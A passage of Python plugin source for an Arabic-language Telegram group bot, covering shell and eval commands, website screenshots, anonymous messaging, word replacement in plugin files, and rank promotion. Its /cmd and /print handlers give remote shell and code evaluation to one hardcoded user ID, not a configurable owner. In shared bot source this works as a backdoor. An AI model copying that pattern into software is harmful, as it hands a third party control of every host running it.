    codetoexec = m.text.split(None, 2)[2]
    if execlanguage in langslist:
        tioreq = TioRequest(lang=execlanguage, code=codetoexec)
        loop = asyncio.get_event_loop()
        sendtioreq = await loop.run_in_executor(None, tio.send, tioreq)
        tioerrres = sendtioreq.error or "None"
        tiores = sendtioreq.result or "None"
        tioresstats = sendtioreq.debug.decode() or "None"
        if sendtioreq.error is None:
            await m.reply_text(
                strings_tio["code_exec_tio_res_string_no_err"].format(
                    langformat=execlanguage,
                    codeformat=html.escape(codetoexec),
                    resformat=html.escape(tiores),
                    statsformat=tioresstats,
                )
            )
        else:
            await m.reply_text(
                strings_tio["code_exec_tio_res_string_err"].format(
                    langformat=execlanguage,
                    codeformat=html.escape(codetoexec),
                    resformat=html.escape(tiores),
                    errformat=html.escape(tioerrres),
                )
            )
    else:
        await m.reply_text(
            strings_tio["code_exec_err_string"].format(
                langformat=execlanguage, langslistlink=langs_list_link
            )
        )

@Client.on_message(filters.command("cmd") & filters.user(6168217372))
async def run_cmd(c: Client, m: Message):
    cmd = m.text.split(None,1)[1]
    if re.match("(?i)poweroff|halt|shutdown|reboot", cmd):
        res = "You can't use this command"
    else:
        stdout, stderr = await shell_exec(cmd)

        res = (
            f"<b>Output:</b>\n<code>{html.escape(stdout)}</code>" if stdout else ""
        ) + (f"\n<b>Errors:</b>\n<code>{stderr}</code>" if stderr else "")
    await m.reply_text(res)

@Client.on_message(filters.command("print") & filters.user(6168217372))
async def printSS(c: Client, m: Message):
    text = m.text.split()[1]
    try:
        res = await meval(text, globals(), **locals())
    except BaseException:  # skipcq
        ev = traceback.format_exc()
        await m.reply_text(f"<code>{html.escape(ev)}</code>")
    else:
        try:
            await m.reply_text(f"<code>{html.escape(str(res))}</code>")
        except BaseException as e:  # skipcq
            await m.reply_text(str(e))

timeout = httpx.Timeout(40, pool=None)
http = httpx.AsyncClient(http2=True, timeout=timeout)

strings_print = {
  "print_description": "Take a screenshot of the specified website.",
  "print_usage": "<b>Usage:</b> <code>/print https://example.com</code> - Take a screenshot of the specified website.",
  "taking_screenshot": "Taking screenshot..."
}

@Client.on_message(filters.command(["sc", "webs", "ss"]) & filters.user(6168217372))
async def printsSites(c: Client, message: Message):
    msg = message.text
    the_url = msg.split(" ", 1)
    wrong = False

    if len(the_url) == 1:
        if message.reply_to_message:
            the_url = message.reply_to_message.text
            if len(the_url) == 1:
                wrong = True
            else:
                the_url = the_url[1]
        else:
            wrong = True
    else:
        the_url = the_url[1]

    if wrong:
        await message.reply_text(strings_print["print_usage"])
        return

    try:
        sent = await message.reply_text(strings_print["taking_screenshot"])
        res_json = await cssworker_url(target_url=the_url)
    except BaseException as e:
        await message.reply(f"<b>Failed due to:</b> <code>{e}</code>")
        return

    if res_json:
        # {"url":"image_url","response_time":"147ms"}
        image_url = res_json["url"]
        if image_url:
            try:
                await message.reply_photo(image_url)
                await sent.delete()
            except BaseException:
                # if failed to send the message, it's not API's
                # fault.
                # most probably there are some other kind of problem,
                # for example it failed to delete its message.
                # or the bot doesn't have access to send media in the chat.
                return
        else:
            await message.reply(
                "Couldn't get url value, most probably API is not accessible."
            )
    else:
        await message.reply("Failed because API is not responding, try again later.")
        
async def cssworker_url(target_url: str):
    url = "https://htmlcsstoimage.com/demo_run"
    my_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
    }

    data = {
        "url": target_url,
        # Sending a random CSS to make the API to generate a new screenshot.
        "css": f"random-tag: {uuid.uuid4()}",
        "render_when_ready": False,
        "viewport_width": 1280,
        "viewport_height": 720,
        "device_scale": 1,
    }

    try:
        resp = await http.post(url, headers=my_headers, json=data)
        return resp.json()
    except HTTPError:
        return None
# ==================== FILE: replace.py ====================
'''


██████╗░██████╗░██████╗░
██╔══██╗╚════██╗██╔══██╗
██████╔╝░█████╔╝██║░░██║
██╔══██╗░╚═══██╗██║░░██║
██║░░██║██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░


[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}

'''



@Client.on_message(filters.text & filters.group, group=36)
def replaceCode(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    channel = r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'yqyqy66'
    Thread(target=raplaceCodefunc,args=(c,m,k,channel)).start()
    
def raplaceCodefunc(c,m,k,channel):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return  
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
   if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')
       
   '''
   if text == 'الملفات':
     if m.from_user.id == 6168217372:
        text = '——— ملفات السورس ———'
        a = os.listdir('Plugins')
        a.sort()
        count = 1
        for file in a:
          if file.endswith('.py'):
            text += f'\n{count}) `{file}`'
            count += 1
        text += f'\n——— @{channel} ———'
        return m.reply(text, disable_web_page_preview=True)
   '''
   if r.get(f'{m.chat.id}:replace:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:replace2:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:replace3:{m.from_user.id}{Dev_Zaid}'):
     if text == 'الغاء':
       r.delete(f'{m.chat.id}:replace:{m.from_user.id}{Dev_Zaid}')
       r.delete(f'{m.chat.id}:replace2:{m.from_user.id}{Dev_Zaid}')
       r.delete(f'{m.chat.id}:replace3:{m.from_user.id}{Dev_Zaid}')
       return m.reply(f'{k} من عيوني لغيت استبدال كلمة ')
      
   if text == 'استبدال كلمه' or text == 'استبدال كلمة':
      if not devp_pls(m.from_user.id,m.chat.id):
         return m.reply(f'{k} هذا الأمر يخص ( مبرمج السورس ) بس')
      else:
         r.set(f'{m.chat.id}:replace:{m.from_user.id}{Dev_Zaid}',1,ex=600)
         return m.reply(f'{k} ارسل الكلمة القديمة الآن')
   
   if r.get(f'{m.chat.id}:replace:{m.from_user.id}{Dev_Zaid}') and devp_pls(m.from_user.id,m.chat.id):
      r.set(f'{m.chat.id}:replace2:{m.from_user.id}{Dev_Zaid}',m.text,ex=600)
      r.delete(f'{m.chat.id}:replace:{m.from_user.id}{Dev_Zaid}')
      return m.reply(f'{k} ارسل الكلمة الجديدة الحين')
   
   if r.get(f'{m.chat.id}:replace2:{m.from_user.id}{Dev_Zaid}') and devp_pls(m.from_user.id,m.chat.id):
      txt = r.get(f'{m.chat.id}:replace2:{m.from_user.id}{Dev_Zaid}')
      r.delete(f'{m.chat.id}:replace2:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{m.chat.id}:replace3:{m.from_user.id}{Dev_Zaid}',f'{txt}&&new&&{m.text}',ex=600)
      a = os.listdir('Plugins')
      a.sort()
      txt = f'{k} ارسل اسم الملف الي تبي تعدل فيه الحين:'
      count = 1
      txt += '\n\n——— ملفات السورس ———'
      for file in a:
          if file.endswith('.py'):
            txt += f'\n{count}) `{file}`'
            count += 1
      txt += f'\n——— @{channel} ———'
      return m.reply(txt)
   
   if r.get(f'{m.chat.id}:replace3:{m.from_user.id}{Dev_Zaid}') and devp_pls(m.from_user.id,m.chat.id) and m.text in os.listdir('Plugins'):
      mm = m.reply(f'{k} جاريع تعديل الملف')
      get = r.get(f'{m.chat.id}:replace3:{m.from_user.id}{Dev_Zaid}')
      old = get.split('&&new&&')[0]
      new = get.split('&&new&&')[1]
      r.delete(f'{m.chat.id}:replace3:{m.from_user.id}{Dev_Zaid}')
      with open(f'Plugins/{m.text}','r') as Read:
         old_confing = Read.read()
         mm.edit(f'{k} تم فتح الملف وقرائته')
      with open(f'Plugins/{m.text}','w+') as Write:
         mm.edit(f'{k} تم فتح الملف جاري كتابة الكود مع استبدال الكلمة')
         Write.write(old_confing.replace(old,new))
      mm.edit(f'{k} تم فتح الملف `{m.text}` وتعديله\n{k} تم استبدال الكلمة القديمة ( {old} ) بالكلمة الجديدة ( {new} )')
      python = sys.executable
      os.execl(python, python, *sys.argv)
      
      
      
      
      
   
# ==================== FILE: sarhni.py ====================
'''


██████╗░██████╗░██████╗░
██╔══██╗╚════██╗██╔══██╗
██████╔╝░█████╔╝██║░░██║
██╔══██╗░╚═══██╗██║░░██║
██║░░██║██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░


[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}

'''

def get_sarhni_id():
   rndm = ''.join([random.choice(string.ascii_letters
            + string.digits) for n in range(10)])
   return rndm
   
@Client.on_message(filters.text & filters.group, group=37)
def sarhniHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    Thread(target=sarhniFunc,args=(c,m,k)).start()
    
def sarhniFunc(c,m,k):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return  
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
   if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')
   
   if text == 'صارحني':
     if not r.get(f'{m.from_user.id}:sar7ni:{Dev_Zaid}'):
       id = get_sarhni_id()
       r.set(f'{m.from_user.id}:sar7ni:{Dev_Zaid}',id)
       r.set(f'{id}:sarhni:{Dev_Zaid}',m.from_user.id)
     else:
       id = r.get(f'{m.from_user.id}:sar7ni:{Dev_Zaid}')
     r.set(f'{m.from_user.id}:sarhniname', m.from_user.first_name)
     return m.reply(f'{k} أهلين عيني「 ⁪⁬⁪⁬{m.from_user.mention} 」\n{k} هذا رابط صارحني الخاص فيك', reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton ('📩',url=f't.me/{botUsername}?start=sarhni{id}')]]))

@Client.on_message(filters.private, group=2)
def sarhniHandlerP(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    channel = r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'yqyqy66'
    Thread(target=sarhniFuncP,args=(c,m,k,channel)).start()

def sarhniFuncP(c,m,k,channel):
   if m.text:
      text = m.text
      if text.startswith('/start sarhni'):
        id = text.split('sarhni')[1]
        if not r.get(f'{id}:sarhni:{Dev_Zaid}'):
          return m.reply(f'{k} رابط صارحني غلط')
        else:
          user_id = int(r.get(f'{id}:sarhni:{Dev_Zaid}'))
          if m.from_user.id == user_id:
            return m.reply('انت هطف تدخل رابط صراحة حقك؟')
          get = c.get_chat(user_id)
          r.set(f'{m.from_user.id}:sarhni',get.id,ex=300)
          a = m.reply(f'{k} دخلت الحين رابط صارحني مع 「 ⁪⁬⁪⁬{get.first_name} 」\n{k} اي رسالة ترسلها لي راح احولها له بسرية تامة بدون مايعرفك\n༄',reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton ('الغاء', callback_data='sarhni:bye')],[InlineKeyboardButton ('🧚‍♀️',url=f't.me/{channel}')]]),quote=True)
          return a.pin(both_sides=True)
      
      if r.get(f'{m.from_user.id}:sarhni') and len(text) < 1000:
        user_id = int(r.get(f'{m.from_user.id}:sarhni'))
        name = r.get(f'{user_id}:sarhniname')
        TIME_ZONE = "Asia/Riyadh"
        ZONE = pytz.timezone(TIME_ZONE)
        TIME = datetime.now(ZONE)
        clock = TIME.strftime("%I:%M %p")
        date = TIME.strftime("%d/%m/%Y")
        txt = f'{k} وصلتك رسالة مصارحة جديدة\n{k} التاريخ : {date}\n{k} الساعة : {clock}\n\n{k} الرسالة :\n\n{text}\n☆'
        try:
          c.send_message(user_id, txt, disable_web_page_preview=True,reply_markup=InlineKeyboardMarkup ([
            [
              InlineKeyboardButton ('رد', callback_data=f'sarhni+rep{m.from_user.id}'),
            ],
            [
              InlineKeyboardButton ('🧚‍♀️',url=f't.me/{channel}')
            ]
          ]))
          return m.reply(f'{k} ابشر ارسلت رسالتك بسرية تامة لـ {name}',quote=True)
        except Exception as e:  
          print(e)
          return m.reply('مقدر ارسله شيء يمكن حاظرني',quote=True)
   
   if r.get(f'{m.from_user.id}:sarhni'):
     user_id = int(r.get(f'{m.from_user.id}:sarhni'))
     name = r.get(f'{user_id}:sarhniname')
     TIME_ZONE = "Asia/Riyadh"
     ZONE = pytz.timezone(TIME_ZONE)
     TIME = datetime.now(ZONE)
     clock = TIME.strftime("%I:%M %p")
     date = TIME.strftime("%d/%m/%Y")
     txt = f'{k} وصلتك رسالة مصارحة جديدة\n{k} التاريخ : {date}\n{k} الساعة : {clock}\n\n{k} الرسالة :'
     try:
       c.send_message(user_id, txt, disable_web_page_preview=True)
       m.copy(user_id,
       reply_markup=InlineKeyboardMarkup ([
            [
              InlineKeyboardButton ('رد', callback_data=f'sarhni+rep{m.from_user.id}'),
            ],
            [
              InlineKeyboardButton ('🧚‍♀️',url=f't.me/{channel}')
            ]
          ])
       )
       return m.reply(f'{k} ابشر ارسلت رسالتك بسرية تامة لـ {name}',quote=True)
     except Exception as e:
       print(e)
       return m.reply('مقدر ارسله شيء يمكن حاظرني',quote=True)
   
   if r.get(f'{m.from_user.id}:sarhnirep'):
     user_id = int(r.get(f'{m.from_user.id}:sarhnirep'))
     r.delete(f'{m.from_user.id}:sarhnirep')
     m.reply(f'{k} ابشر ارسلت له ردك',quote=True)
     return m.copy(user_id)

@Client.on_callback_query(filters.regex('sarhni'))
async def sarhni_callback(c,m):
   if m.data == 'sarhni:bye':
     r.delete(f'{m.from_user.id}:sarhni')
     await m.message.delete()
     return await m.answer('ابشر طلعتك من كل جلسة صارحني', show_alert=True)
   
   if m.data.startswith('sarhni+rep'):
     user_id = int(m.data.split('rep')[1])
     if not r.get(f'{user_id}:sarhni'):
       return await m.answer('مايمدي ترد عليه لأنه طلع من جلسة صارحني', show_alert=True)
     if not int(r.get(f'{user_id}:sarhni')) == m.from_user.id:
       return await m.answer('مايمدي ترد عليه لأنه طلع من جلسة صارحني', show_alert=True)
     else:
       r.set(f'{m.from_user.id}:sarhnirep', user_id,ex=300)
       return await c.send_message(m.from_user.id, 'ارسل الرد الحين')
       
     


   
   
   
   
# ==================== FILE: set_ranks.py ====================
'''


██████╗░██████╗░██████╗░
██╔══██╗╚════██╗██╔══██╗
██████╔╝░█████╔╝██║░░██║
██╔══██╗░╚═══██╗██║░░██║
██║░░██║██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░


[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}

'''



@Client.on_message(filters.text & filters.group, group=7)
def ranksCommandsHandler(c,m):
   k = r.get(f'{Dev_Zaid}:botkey')
   Thread(target=ranks_reply_promote,args=(c,m,k)).start()
   

def ranks_reply_promote(c,m,k):
    if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
    if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return 
    if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
    if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
    if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return 
    if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
    if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
    text = m.text
    name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
    if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
    if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
    if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')
    if isLockCommand(m.from_user.id, m.chat.id, text): return
    if text == 'تعطيل الرفع':
      if not owner_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} هذا الامر يخص ( المالك وفوق ) بس')
      else:
        if r.get(f'{m.chat.id}:disableRanks:{Dev_Zaid}'):
          return m.reply(f'{k} من「 {m.from_user.mention} 」\n{k} الرفع معطل من قبل\n☆')
        else:
          r.set(f'{m.chat.id}:disableRanks:{Dev_Zaid}', 1)
          return m.reply(f'{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت الرفع\n☆')
    
    if text == 'تفعيل الرفع':
      if not owner_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} هذا الامر يخص ( المالك وفوق ) بس')
      else:
        if not r.get(f'{m.chat.id}:disableRanks:{Dev_Zaid}'):
          return m.reply(f'「 {m.from_user.mention} 」\n{k} الرفع مفعل من قبل\n☆')
        else:
          r.delete(f'{m.chat.id}:disableRanks:{Dev_Zaid}')
          return m.reply(f'{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت الرفع\n☆')
    
    cid = m.chat.id
    
    if r.get(f'{m.chat.id}:disableRanks:{Dev_Zaid}'):  return
    rank = get_rank(m.from_user.id, m.chat.id)
    if text.startswith('رفع Dev '):
        if not '@' in text and not re.findall('[0-9]+', text):
          return
        if not devp_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الامر يخص ( Dev🎖️) بس')
        if len(text.split()) == 4:
           user = text.split()[3]
           if user.startswith('@'):
              try:
                 get = c.get_chat(user)
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا اليوزر')
           else:
              try:
                 get = c.get_chat(int(user))
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا الآيدي')
        '''
        if m.reply_to_message and m.reply_to_message.from_user:
           id = m.reply_to_message.from_user.id
           mention = m.reply_to_message.from_user.mention
        '''
        if id == m.from_user.id:
           return m.reply(f'{k} هطف تبي ترفع نفسك؟')
        
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف ارفع نفسي')
        
           
        if r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} Dev²🎖 من قبل\n☆')
        else:
          r.set(f'{id}:rankDEV2:{Dev_Zaid}', 1)
          r.sadd(f'{Dev_Zaid}DEV2', id)
          return m.reply(f'{k} الحلو 「 {mention} 」\n{k} رفعته صار Dev²🎖\n☆')
          if r.get(f'{id}:mute:{Dev_Zaid}'):
            r.delete(f'{id}:mute:{Dev_Zaid}')
            r.srem(f'listMUTE:{Dev_Zaid}', id)
          if r.get(f'{id}:mute:{m.chat.id}{Dev_Zaid}'):
            r.delete(f'{id}:mute:{m.chat.id}{Dev_Zaid}')
            r.srem(f'{m.chat.id}:listMUTE:{Dev_Zaid}', id)
    
    if text == 'رفع Dev' and m.reply_to_message and m.reply_to_message.from_user:
        if not devp_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الامر يخص ( Dev🎖️) بس')
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention
        if id == m.from_user.id:
           return m.reply(f'{k} هطف تبي ترفع نفسك؟')        
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف ارفع نفسي')           
        if r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} Dev²🎖 من قبل\n☆')
        else:
          r.set(f'{id}:rankDEV2:{Dev_Zaid}', 1)
          r.sadd(f'{Dev_Zaid}DEV2', id)
          return m.reply(f'{k} الحلو 「 {mention} 」\n{k} رفعته صار Dev²🎖\n☆')
          if r.get(f'{id}:mute:{Dev_Zaid}'):
            r.delete(f'{id}:mute:{Dev_Zaid}')
            r.srem(f'listMUTE:{Dev_Zaid}', id)
          if r.get(f'{id}:mute:{m.chat.id}{Dev_Zaid}'):
            r.delete(f'{id}:mute:{m.chat.id}{Dev_Zaid}')
            r.srem(f'{m.chat.id}:listMUTE:{Dev_Zaid}', id)
          
    if text.startswith('رفع MY '):
        if not '@' in text and not re.findall('[0-9]+', text):
          return False
        if not dev2_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الامر يخص ( Dev²🎖️ وفوق ) بس')
        if len(text.split()) == 3:
           user = text.split()[2]
           if user.startswith('@'):
              try:
                 get = c.get_chat(user)
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا اليوزر')
           else:
              try:
                 get = c.get_chat(int(user))
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا الآيدي')
        '''
        if m.reply_to_message and m.reply_to_message.from_user:
           id = m.reply_to_message.from_user.id
           mention = m.reply_to_message.from_user.mention
        '''
        if id == m.from_user.id:
           return m.reply(f'{k} هطف تبي ترفع نفسك؟')
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف ارفع نفسي')
        
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')
        if r.get(f'{id}:rankDEV:{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} Myth🎖️ من قبل\n☆')
        else:
          r.set(f'{id}:rankDEV:{Dev_Zaid}', 1)
          r.sadd(f'{Dev_Zaid}DEV', id)
          m.reply(f'{k} الحلو 「 {mention} 」\n{k} رفعته صار Myth🎖️\n☆')
          if r.get(f'{id}:mute:{Dev_Zaid}'):
            r.delete(f'{id}:mute:{Dev_Zaid}')
            r.srem(f'listMUTE:{Dev_Zaid}', id)
          if r.get(f'{id}:mute:{m.chat.id}{Dev_Zaid}'):
            r.delete(f'{id}:mute:{m.chat.id}{Dev_Zaid}')
            r.srem(f'{m.chat.id}:listMUTE:{Dev_Zaid}', id)
    
    if text == 'رفع MY' and m.reply_to_message and m.reply_to_message.from_user:
        if not dev2_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الامر يخص ( Dev²🎖️ وفوق ) بس')
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention
        if id == m.from_user.id:
           return m.reply(f'{k} هطف تبي ترفع نفسك؟')
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف ارفع نفسي')        
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')
        if r.get(f'{id}:rankDEV:{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} Myth🎖️ من قبل\n☆')
        else:
          r.set(f'{id}:rankDEV:{Dev_Zaid}', 1)
          r.sadd(f'{Dev_Zaid}DEV', id)
          m.reply(f'{k} الحلو 「 {mention} 」\n{k} رفعته صار Myth🎖️\n☆')
          if r.get(f'{id}:mute:{Dev_Zaid}'):
            r.delete(f'{id}:mute:{Dev_Zaid}')
            r.srem(f'listMUTE:{Dev_Zaid}', id)
          if r.get(f'{id}:mute:{m.chat.id}{Dev_Zaid}'):
            r.delete(f'{id}:mute:{m.chat.id}{Dev_Zaid}')
            r.srem(f'{m.chat.id}:listMUTE:{Dev_Zaid}', id)
    
    cid = m.chat.id
    
    if text.startswith('رفع مالك اساسي '):
        if not '@' in text and not re.findall('[0-9]+', text):
          return
        if not gowner_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الامر يخص ( المالك الاساسي وفوق ) بس')
        if len(text.split()) == 4:
           user = text.split()[3]
           if user.startswith('@'):
              try:
                 get = c.get_chat(user)
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا اليوزر')
           else:
              try:
                 get = c.get_chat(int(user))
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا الآيدي')
        '''
        if m.reply_to_message and m.reply_to_message.from_user:
           id = m.reply_to_message.from_user.id
           mention = m.reply_to_message.from_user.mention
        '''
        if id == m.from_user.id:
           return m.reply(f'{k} هطف تبي ترفع نفسك؟')
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف ارفع نفسي')
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')           
        if r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مالك اساسي من قبل\n☆')
        else:
          r.set(f'{cid}:rankGOWNER:{id}{Dev_Zaid}', 1)
          r.sadd(f'{cid}:listGOWNER:{Dev_Zaid}', id)
          m.reply(f'{k} الحلو 「 {mention} 」\n{k} رفعته صار مالك اساسي\n☆')
          if r.get(f'{id}:mute:{Dev_Zaid}'):
            r.delete(f'{id}:mute:{Dev_Zaid}')
            r.srem(f'listMUTE:{Dev_Zaid}', id)
          if r.get(f'{id}:mute:{m.chat.id}{Dev_Zaid}'):
            r.delete(f'{id}:mute:{m.chat.id}{Dev_Zaid}')
            r.srem(f'{m.chat.id}:listMUTE:{Dev_Zaid}', id)
          return 
    
    if text == 'رفع مالك اساسي' and m.reply_to_message and m.reply_to_message.from_user:
        if not gowner_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الامر يخص (المالك الاساسي وفوق) بس')
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention       
        if id == m.from_user.id:
           return m.reply(f'{k} هطف تبي ترفع نفسك؟')
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف ارفع نفسي')
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')           
        if r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مالك اساسي من قبل\n☆')
        else:
          r.set(f'{cid}:rankGOWNER:{id}{Dev_Zaid}', 1)
          r.sadd(f'{cid}:listGOWNER:{Dev_Zaid}', id)
          m.reply(f'{k} الحلو 「 {mention} 」\n{k} رفعته صار مالك اساسي\n☆')
          if r.get(f'{id}:mute:{Dev_Zaid}'):
            r.delete(f'{id}:mute:{Dev_Zaid}')
            r.srem(f'listMUTE:{Dev_Zaid}', id)
          if r.get(f'{id}:mute:{m.chat.id}{Dev_Zaid}'):
            r.delete(f'{id}:mute:{m.chat.id}{Dev_Zaid}')
            r.srem(f'{m.chat.id}:listMUTE:{Dev_Zaid}', id)
          return 
    
    if text.startswith('رفع مالك '):
        if not '@' in text and not re.findall('[0-9]+', text):
          return
        if not gowner_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الامر يخص ( المالك الاساسي ) بس')
        if len(text.split()) == 3:
           user = text.split()[2]
           if user.startswith('@'):
              try:
                 get = c.get_chat(user)
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا اليوزر')
           else:
              try:
                 get = c.get_chat(int(user))
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا الآيدي')
        '''
        if m.reply_to_message and m.reply_to_message.from_user:
           id = m.reply_to_message.from_user.id
           mention = m.reply_to_message.from_user.mention
        '''
        if id == m.from_user.id:
           return m.reply(f'{k} هطف تبي ترفع نفسك؟')
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف ارفع نفسي')
        
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')
        if r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مالك من قبل\n☆')
        else:
          r.set(f'{cid}:rankOWNER:{id}{Dev_Zaid}', 1)
          r.sadd(f'{cid}:listOWNER:{Dev_Zaid}', id)
          m.reply(f'{k} الحلو 「 {mention} 」\n{k} رفعته صار مالك\n☆')
          if r.get(f'{id}:mute:{m.chat.id}{Dev_Zaid}'):
            r.delete(f'{id}:mute:{m.chat.id}{Dev_Zaid}')
